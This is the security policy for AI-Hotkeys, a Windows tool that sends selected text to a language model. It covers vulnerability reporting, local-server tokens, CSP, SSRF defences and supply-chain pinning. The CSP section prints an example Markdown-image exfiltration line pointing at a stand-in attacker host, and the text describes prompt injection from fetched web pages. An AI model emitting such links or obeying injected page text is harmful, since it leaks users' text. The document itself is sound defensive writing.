# Security

## Reporting a vulnerability

Please report security problems privately. On the project's GitHub page
(<https://github.com/Jack8090-sudo/AI-Hotkeys>), open the **Security** tab and choose **Report a
vulnerability**. If that button is not available, open an ordinary issue that only asks for a private
contact, without technical details.

Include the AI-Hotkeys version, your Windows version, and steps to reproduce. Fixes ship in a new release,
with credit if you want it.

Supported versions: only the latest release. The v1.0.0 build was never published and is not supported;
upgrade as described in [docs/INSTALL.md](docs/INSTALL.md#migration-from-v100).

## Security model

AI-Hotkeys runs as your Windows user and acts on text you select. It is designed so that other users of
the PC, other computers on the network, websites and text returned by the model cannot take control of it
or read your text.

### Install folder

- The installer uses `%LOCALAPPDATA%\Programs\AI-Hotkeys` by default. Only your account, SYSTEM and
  Administrators can access it. AI-Hotkeys starts its scripts and the bundled Python from that folder at
  every login, so other users must not be able to change it.
- A folder you choose outside your profile gets the same restriction: inheritance is removed, and only
  your account, SYSTEM and Administrators keep access.
- The installer refuses drive roots, folders that cannot be written, and folders inside a git repository.
- `work\`, which briefly holds your selected text, is restricted the same way at first start.

### Bundled Python

The bundled interpreter is the official embeddable CPython with a `python313._pth` file, and every launch
also passes `-E -s`. `PYTHONPATH`, other `PYTHON*` variables and your user site-packages are ignored, so a
planted module elsewhere on the PC cannot be loaded.

### Local pages: token model

The results page and the Settings page are HTTP servers inside AI-Hotkeys' Python processes.

- They listen on `127.0.0.1` only, on a random port chosen at start.
- Each server creates a random token (`secrets.token_urlsafe(18)`) at start. The page is served only for
  `/?t=<token>`; every API request must carry the token in an `X-Token` header. Token comparison is
  constant-time.
- Requests whose `Host` header is not `127.0.0.1` or `localhost` get 403, which blocks DNS-rebinding
  attacks from websites.
- The token is removed from the address bar after the page loads, so it does not stay in the browser
  history. As a consequence, reloading the page (F5) is not possible.
- The servers shut down after about 4 minutes (results) or 5 minutes (Settings) without requests, and drop
  a client that takes more than 30 seconds to send its request.

### Content-Security-Policy

Both pages send this policy:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; font-src 'self';
img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

The pages can only talk to their own server, load their own fonts and show `data:` or same-origin images.
Answers are rendered from Markdown, and remote images in them are replaced by a link ("Image: <name>"). This
blocks the classic exfiltration trick in which a prompt-injected web page makes the model write
`![](https://attacker/?q=<your text>)`. Inline scripts are allowed because the pages are single files;
raw HTML inside model output is escaped and shown as text, never run.

### Settings writes

The Settings page validates every value against an allowlist before writing `config.ini`. The writer
rejects line breaks and invalid names, keeps comments, order, BOM and line endings, and replaces the file
atomically. Saving an Ollama address on another computer is allowed, with a warning that your text will be
sent there.

### Web search and page fetching (SSRF policy)

End reads web pages found by the search. Because the result URLs come from the internet, they are treated as
hostile:

- Only `http` and `https` on ports 80 and 443 are fetched. URLs with credentials are refused.
- The host name is resolved first, and **every** address must be a public internet address. Refused:
  loopback, private and unique-local ranges, link-local, CGNAT, multicast, reserved ranges, cloud metadata
  addresses, IPv4-mapped, NAT64 and 6to4 forms of those, decimal, hex, octal and short IP spellings,
  `localhost` and `*.localhost`. A host that resolves to both public and internal addresses is refused as a
  whole. There is deliberately no setting to turn this off.
- The connection goes to the address that was checked (curl_cffi via `CURLOPT_RESOLVE`; the standard-library
  path opens the socket itself), so a DNS answer cannot change between the check and the connection.
- Redirects are followed by hand, at most 5, and every hop is checked again.
- Each page has a 12 s wall-clock limit and the whole reading phase 15 s, so a slow server cannot stall End.
- Proxy environment variables are ignored for page fetches.

**Residual risks.**

- The SearXNG address from `config.ini` (`searxng_url`, normally `127.0.0.1`) is trusted and not checked.
- A machine that can reach the web only through a proxy reads no pages; search snippets still work.
- Pages still downloading when the phase ends are abandoned, not killed; each stops within its own 12 s.
- The search words themselves leave your PC by design; see [PRIVACY.md](PRIVACY.md).
- Text from web pages reaches the model. A page can try to steer the answer (prompt injection). The CSP and
  the image rule above stop it from sending your text anywhere, but the answer itself can be wrong or
  misleading. Check the cited sources.

### SearXNG

The bundled SearXNG binds `127.0.0.1` only, exclusively, so another program cannot share its port. It
answers 403 to requests whose `Host` header is not `127.0.0.1` or `localhost`. A lock file prevents two
copies from running. AI-Hotkeys stops it on exit only after checking that the process id still belongs to
the bundled interpreter and has the recorded start time, so an unrelated program that reused the id is
never killed.

### Direct replace

PgUp pastes only into the window it started from, and only when a fresh copy of the selection still matches
the text that was sent to the model. Consoles never receive Ctrl+C.

### Updates and supply chain

- Releases are built by `.github/workflows/release.yml` from a tagged commit with `build\build.ps1`. Every
  download (Python, AutoHotkey, SearXNG, NSIS and the Python wheels) is pinned by SHA-256, and GitHub Actions
  are pinned by commit. The release carries `SHA256SUMS.txt` and a build-provenance attestation, which you
  can check with `gh attestation verify <file> --repo Jack8090-sudo/AI-Hotkeys`.
- The installer is not code-signed yet, so SmartScreen warns on first run.
- AI-Hotkeys has no auto-update; install new versions yourself.

### Known limits

- AI-Hotkeys runs with your rights. Any program running as you can read your clipboard, the `work\`
  folder and `config.ini`, as with any desktop program.
- `config.ini` and `prompts_user.py` are trusted: `prompts_user.py` is Python code that runs with your rights.
  Only edit it yourself.
- In windows of programs running as administrator, copy and paste from AI-Hotkeys may not work (Windows
  blocks input from lower-privileged programs).
